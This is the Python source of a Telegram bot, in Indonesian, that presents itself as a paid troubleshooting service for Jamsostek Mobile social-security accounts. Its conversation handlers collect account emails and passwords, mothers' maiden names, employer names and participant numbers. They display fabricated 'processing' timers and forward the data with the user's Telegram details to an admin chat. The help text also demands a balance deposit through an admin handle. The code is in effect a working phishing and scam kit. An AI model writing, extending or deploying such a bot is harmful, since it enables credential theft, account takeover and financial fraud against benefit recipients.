import logging
from telegram import Update, ReplyKeyboardMarkup, ReplyKeyboardRemove
from telegram.ext import Application, CommandHandler, MessageHandler, ConversationHandler, ContextTypes, filters
import re
from datetime import datetime
from config import BOT_TOKEN, ADMIN_ID

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# State constants
MAIN_MENU, CHOOSE_SERVICE, KODE_040_EMAIL, KODE_040_PASSWORD, KODE_040_TAHUN, SUSPEND_EMAIL, SUSPEND_PASSWORD, UNLOCK_IBU, UNLOCK_PERUSAHAAN, UNLOCK_GMAIL, UNLOCK_NOMOR = range(11)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Start command dan tampilkan menu utama"""
    user = update.effective_user
    
    welcome_text = f"""
╔═══════════════════════════════════════╗
║   🤖 BOT JAMSOSTEK TROUBLESHOOTING   ║
║      SELAMAT DATANG, {user.first_name}!       ║
╚═══════════════════════════════════════╝

📋 KLAIM JMO TROUBLESHOOTING

Pilihan : 
*=>>Kode 040 Harga Rp 450.000
*=>>Suspend Nomor KPJ Rp 300.000
*=>>Unlock Biometrik Rp 350.000

Pilih layanan yang Anda butuhkan:
"""
    
    keyboard = [
        ["🔹 Kode 040"],
        ["🔹 Suspend Nomor KPJ"],
        ["🔹 Unlock Biometrik"],
        ["ℹ️ Bantuan"]
    ]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=False)
    
    await update.message.reply_text(welcome_text, reply_markup=reply_markup, parse_mode='HTML')
    return CHOOSE_SERVICE

async def choose_service(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle service selection"""
    text = update.message.text.strip()
    
    if "Kode 040" in text:
        context.user_data['service'] = 'Kode 040'
        response_text = """
╔═══════════════════════════════════════╗
║      📱 KODE 040 - CLAIM PROCESS      ║
╚═══════════════════════════════════════╝

*[Login akun Jamsostek Mobile]
*[Masukan Email dan Password Jamsostek Mobile]
* [Klaim Langsung]
* [Isi Tahun KPJ]
* [Proses .... 60menit]
* [Mohon Menunggu....]

Silakan masukkan EMAIL Jamsostek Mobile Anda:
"""
        await update.message.reply_text(response_text, reply_markup=ReplyKeyboardRemove(), parse_mode='HTML')
        return KODE_040_EMAIL
    
    elif "Suspend Nomor KPJ" in text:
        context.user_data['service'] = 'Suspend Nomor KPJ'
        response_text = """
╔═══════════════════════════════════════╗
║    🔐 SUSPEND NOMOR KPJ - PROCESS     ║
╚═══════════════════════════════════════╝

*[Login akun Jamsostek Mobile]
*[Masukan Email dan Password Jamsostek Mobile]
*[Tombol Lepas Suspend]
*[Proses .... 45menit]
*[Mohon Menunggu]

Silakan masukkan EMAIL Jamsostek Mobile Anda:
"""
        await update.message.reply_text(response_text, reply_markup=ReplyKeyboardRemove(), parse_mode='HTML')
        return SUSPEND_EMAIL
    
    elif "Unlock Biometrik" in text:
        context.user_data['service'] = 'Unlock Biometrik'
        response_text = """
╔═══════════════════════════════════════╗
║    🔓 UNLOCK BIOMETRIK - PROCESS      ║
╚═══════════════════════════════════════╝

*[Masukan Nama Ibu Kandung]
*[Masukan Nama Perusahaan]
*[Masukan Gmail Aktif]
*[Masukan Nomor Peserta]

Silakan masukkan NAMA IBU KANDUNG Anda:
"""
        await update.message.reply_text(response_text, reply_markup=ReplyKeyboardRemove(), parse_mode='HTML')
        return UNLOCK_IBU
    
    elif "Bantuan" in text:
        await show_help(update, context)
        return CHOOSE_SERVICE
    
    else:
        await update.message.reply_text("❌ Pilihan tidak valid. Silakan pilih dari menu di bawah.")
        return CHOOSE_SERVICE

# ==================== KODE 040 HANDLERS ====================

async def kode_040_email(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle Kode 040 - Email input"""
    email = update.message.text.strip()
    
    if not is_valid_email(email):
        await update.message.reply_text("❌ Format email tidak valid. Silakan masukkan email yang benar (contoh: user@gmail.com):")
        return KODE_040_EMAIL
    
    context.user_data['email'] = email
    
    response_text = """
✅ Langkah berikutnya:

Silakan masukkan PASSWORD Jamsostek Mobile Anda:
"""
    await update.message.reply_text(response_text)
    return KODE_040_PASSWORD

async def kode_040_password(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle Kode 040 - Password input"""
    password = update.message.text
    context.user_data['password'] = password
    
    response_text = """
✅ Langkah berikutnya:

Silakan masukkan TAHUN KPJ yang akan diklaim:
(Contoh: 2023, 2024)
"""
    await update.message.reply_text(response_text)
    return KODE_040_TAHUN

async def kode_040_tahun(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle Kode 040 - Tahun KPJ input"""
    tahun = update.message.text.strip()
    
    if not tahun.isdigit() or len(tahun) != 4:
        await update.message.reply_text("❌ Format tahun tidak valid. Silakan masukkan tahun dengan 4 digit (Contoh: 2023):")
        return KODE_040_TAHUN
    
    context.user_data['tahun'] = tahun
    
    # Show processing message
    processing_text = """
⏳ <b>PROSES SEDANG BERLANGSUNG</b> ⏳

⌛ Estimasi waktu: <b>60 menit</b>

🔄 Sistem sedang memproses permintaan Anda...
📊 Status: Pending Processing
🕐 Waktu dimulai: {waktu}

⚠️ Mohon Menunggu...
Jangan menutup aplikasi ini

✨ Anda akan menerima notifikasi ketika proses selesai.
""".format(waktu=datetime.now().strftime("%H:%M:%S"))
    
    await update.message.reply_text(processing_text, parse_mode='HTML')
    
    # Prepare summary
    summary = await prepare_summary(context.user_data)
    await update.message.reply_text(summary, parse_mode='HTML')
    
    # Send to admin
    await send_to_admin(update, context)
    
    return ConversationHandler.END

# ==================== SUSPEND KPJ HANDLERS ====================

async def suspend_email(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle Suspend KPJ - Email input"""
    email = update.message.text.strip()
    
    if not is_valid_email(email):
        await update.message.reply_text("❌ Format email tidak valid. Silakan masukkan email yang benar:")
        return SUSPEND_EMAIL
    
    context.user_data['email'] = email
    
    response_text = """
✅ Langkah berikutnya:

Silakan masukkan PASSWORD Jamsostek Mobile Anda:
"""
    await update.message.reply_text(response_text)
    return SUSPEND_PASSWORD

async def suspend_password(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle Suspend KPJ - Password input"""
    password = update.message.text
    context.user_data['password'] = password
    
    # Show processing message
    processing_text = """
⏳ <b>PROSES LEPAS SUSPEND BERLANGSUNG</b> ⏳

⌛ Estimasi waktu: <b>45 menit</b>

🔄 Sistem sedang memproses permintaan Anda...
📊 Status: Pending Processing
🕐 Waktu dimulai: {waktu}

⚠️ Mohon Menunggu...
Jangan menutup aplikasi ini

✨ Anda akan menerima notifikasi ketika proses selesai.
""".format(waktu=datetime.now().strftime("%H:%M:%S"))
    
    await update.message.reply_text(processing_text, parse_mode='HTML')
    
    # Prepare summary
    summary = await prepare_summary(context.user_data)
    await update.message.reply_text(summary, parse_mode='HTML')
    
    # Send to admin
    await send_to_admin(update, context)
    
    return ConversationHandler.END

# ==================== UNLOCK BIOMETRIK HANDLERS ====================

async def unlock_ibu(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle Unlock Biometrik - Nama Ibu"""
    nama_ibu = update.message.text.strip()
    
    if len(nama_ibu) < 3:
        await update.message.reply_text("❌ Nama terlalu pendek. Silakan masukkan nama lengkap ibu kandung:")
        return UNLOCK_IBU
    
    context.user_data['nama_ibu'] = nama_ibu
    
    response_text = """
✅ Langkah berikutnya:

Silakan masukkan NAMA PERUSAHAAN Anda:
"""
    await update.message.reply_text(response_text)
    return UNLOCK_PERUSAHAAN

async def unlock_perusahaan(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle Unlock Biometrik - Nama Perusahaan"""
    nama_perusahaan = update.message.text.strip()
    
    if len(nama_perusahaan) < 3:
        await update.message.reply_text("❌ Nama perusahaan terlalu pendek. Silakan coba lagi:")
        return UNLOCK_PERUSAHAAN
    
    context.user_data['nama_perusahaan'] = nama_perusahaan
    
    response_text = """
✅ Langkah berikutnya:

Silakan masukkan GMAIL AKTIF Anda:
"""
    await update.message.reply_text(response_text)
    return UNLOCK_GMAIL

async def unlock_gmail(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle Unlock Biometrik - Gmail"""
    gmail = update.message.text.strip()
    
    if not is_valid_email(gmail):
        await update.message.reply_text("❌ Format email tidak valid. Silakan gunakan format Gmail (contoh: nama@gmail.com):")
        return UNLOCK_GMAIL
    
    context.user_data['email'] = gmail
    
    response_text = """
✅ Langkah terakhir:

Silakan masukkan NOMOR PESERTA Jamsostek Anda:
(13 digit, contoh: 1234567890123)
"""
    await update.message.reply_text(response_text)
    return UNLOCK_NOMOR

async def unlock_nomor(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle Unlock Biometrik - Nomor Peserta"""
    nomor = update.message.text.strip()
    
    if not nomor.isdigit() or len(nomor) != 13:
        await update.message.reply_text("❌ Nomor peserta harus 13 digit. Silakan masukkan ulang:")
        return UNLOCK_NOMOR
    
    context.user_data['nomor_peserta'] = nomor
    
    # Prepare summary
    summary = await prepare_summary(context.user_data)
    await update.message.reply_text(summary, parse_mode='HTML')
    
    # Send to admin
    await send_to_admin(update, context)
    
    return ConversationHandler.END

# ==================== UTILITY FUNCTIONS ====================

def is_valid_email(email):
    """Validate email format"""
    pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
    return re.match(pattern, email) is not None

async def prepare_summary(user_data):
    """Prepare data summary"""
    service = user_data.get('service', 'N/A')
    
    summary = """
╔═══════════════════════════════════════╗
║    ✅ DATA BERHASIL DIKIRIM KE ADMIN  ║
╚═══════════════════════════════════════╝

📋 <b>RINGKASAN DATA ANDA:</b>
"""
    
    if service == 'Kode 040':
        summary += f"""
• Service: {service}
• Email: {user_data.get('email', 'N/A')}
• Tahun KPJ: {user_data.get('tahun', 'N/A')}
• Status: ⏳ Proses (60 menit)
• Waktu Dikirim: {datetime.now().strftime("%d-%m-%Y %H:%M:%S")}
"""
    
    elif service == 'Suspend Nomor KPJ':
        summary += f"""
• Service: {service}
• Email: {user_data.get('email', 'N/A')}
• Status: ⏳ Proses (45 menit)
• Waktu Dikirim: {datetime.now().strftime("%d-%m-%Y %H:%M:%S")}
"""
    
    elif service == 'Unlock Biometrik':
        summary += f"""
• Service: {service}
• Nama Ibu Kandung: {user_data.get('nama_ibu', 'N/A')}
• Nama Perusahaan: {user_data.get('nama_perusahaan', 'N/A')}
• Gmail: {user_data.get('email', 'N/A')}
• Nomor Peserta: {user_data.get('nomor_peserta', 'N/A')}
• Waktu Dikirim: {datetime.now().strftime("%d-%m-%Y %H:%M:%S")}
"""
    
    summary += """
💡 Tekan /start untuk kembali ke menu utama
"""
    
    return summary

async def send_to_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Send collected data to admin"""
    user = update.effective_user
    user_data = context.user_data
    service = user_data.get('service', 'N/A')
    
    admin_message = f"""
╔═══════════════════════════════════════╗
║      📨 DATA BARU DARI USER           ║
╚═══════════════════════════════════════╝

👤 <b>INFO PENGGUNA:</b>
• Nama: {user.first_name} {user.last_name or ''}
• Username: @{user.username or 'N/A'}
• User ID: {user.id}
• Waktu: {datetime.now().strftime("%d-%m-%Y %H:%M:%S")}

📋 <b>LAYANAN:</b> {service}

"""

    if service == 'Kode 040':
        admin_message += f"""📝 <b>DATA KODE 040:</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
• Email: {user_data.get('email', 'N/A')}
• Password: {'*' * max(1, len(str(user_data.get('password', ''))))}
• Tahun KPJ: {user_data.get('tahun', 'N/A')}
• Status Proses: ⏳ 60 menit
"""

    elif service == 'Suspend Nomor KPJ':
        admin_message += f"""📝 <b>DATA SUSPEND KPJ:</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
• Email: {user_data.get('email', 'N/A')}
• Password: {'*' * max(1, len(str(user_data.get('password', ''))))}
• Status Proses: ⏳ 45 menit
"""

    elif service == 'Unlock Biometrik':
        admin_message += f"""📝 <b>DATA UNLOCK BIOMETRIK:</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
• Nama Ibu Kandung: {user_data.get('nama_ibu', 'N/A')}
• Nama Perusahaan: {user_data.get('nama_perusahaan', 'N/A')}
• Gmail Aktif: {user_data.get('email', 'N/A')}
• Nomor Peserta: {user_data.get('nomor_peserta', 'N/A')}
"""

    admin_message += """
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ Silakan segera hubungi user ini!
"""

    try:
        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=admin_message,
            parse_mode='HTML'
        )
        logger.info(f"Data sent to admin for user {user.id}")
    except Exception as e:
        logger.error(f"Error sending message to admin: {e}")

async def show_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show help information including balance info"""
    help_text = """
╔═══════════════════════════════════════╗
║        🆘 BANTUAN & INFORMASI        ║
╚═══════════════════════════════════════╝

<b>📌 LAYANAN YANG TERSEDIA:</b>

<b>1️⃣ KODE 040 - Rp 450.000</b>
   *[Login akun Jamsostek Mobile]
   *[Masukan Email dan Password Jamsostek Mobile]
   * [Klaim Langsung]
   * [Isi Tahun KPJ]
   * [Proses .... 60menit]
   * [Mohon Menunggu....]

<b>2️⃣ SUSPEND NOMOR KPJ - Rp 300.000</b>
   *[Login akun Jamsostek Mobile]
   *[Masukan Email dan Password Jamsostek Mobile]
   *[Tombol Lepas Suspend]
   *[Proses .... 45menit]
   *[Mohon Menunggu]

<b>3️⃣ UNLOCK BIOMETRIK - Rp 350.000</b>
   *[Masukan Nama Ibu Kandung]
   *[Masukan Nama Perusahaan]
   *[Masukan Gmail Aktif]
   *[Masukan Nomor Peserta]

<b>💰 ISI SALDO:</b>
• Isi saldo minimal Rp 500.000
• Setiap isi saldo, fitur persetujuan ada di admin @play1990

<b>📱 PERINTAH YANG TERSEDIA:</b>
/start - Kembali ke menu utama
/help - Tampilkan bantuan ini
/cancel - Batalkan proses

<b>📞 HUBUNGI ADMIN:</b>
@play1990

<b>⚠️ CATATAN PENTING:</b>
• Pastikan data yang Anda masukkan sudah benar
• Jangan membagikan password kepada siapapun
• Proses membutuhkan waktu sesuai estimasi
• Anda akan dihubungi admin segera setelah data diterima
"""
    await update.message.reply_text(help_text, parse_mode='HTML')

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Cancel and return to main menu"""
    await update.message.reply_text(
        "❌ Proses dibatalkan.\n\nTekan /start untuk kembali ke menu utama.",
        reply_markup=ReplyKeyboardRemove()
    )
    return ConversationHandler.END

def main() -> None:
    """Start the bot"""
    application = Application.builder().token(BOT_TOKEN).build()

    # Main conversation handler
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('start', start)],
        states={
            CHOOSE_SERVICE: [
                MessageHandler(filters.Regex('^🔹 Kode 040$'), choose_service),
                MessageHandler(filters.Regex('^🔹 Suspend Nomor KPJ$'), choose_service),
                MessageHandler(filters.Regex('^🔹 Unlock Biometrik$'), choose_service),
                MessageHandler(filters.Regex('^ℹ️ Bantuan$'), choose_service),
            ],
            KODE_040_EMAIL: [MessageHandler(filters.TEXT & ~filters.COMMAND, kode_040_email)],
            KODE_040_PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, kode_040_password)],
            KODE_040_TAHUN: [MessageHandler(filters.TEXT & ~filters.COMMAND, kode_040_tahun)],
            SUSPEND_EMAIL: [MessageHandler(filters.TEXT & ~filters.COMMAND, suspend_email)],
            SUSPEND_PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, suspend_password)],
            UNLOCK_IBU: [MessageHandler(filters.TEXT & ~filters.COMMAND, unlock_ibu)],
            UNLOCK_PERUSAHAAN: [MessageHandler(filters.TEXT & ~filters.COMMAND, unlock_perusahaan)],
            UNLOCK_GMAIL: [MessageHandler(filters.TEXT & ~filters.COMMAND, unlock_gmail)],
            UNLOCK_NOMOR: [MessageHandler(filters.TEXT & ~filters.COMMAND, unlock_nomor)],
        },
        fallbacks=[CommandHandler('cancel', cancel)]
    )

    application.add_handler(conv_handler)
    application.add_handler(CommandHandler('help', show_help))
    
    # Run the bot
    print("🤖 Bot is running... Press Ctrl+C to stop")
    application.run_polling()

if __name__ == '__main__':
    main()
    
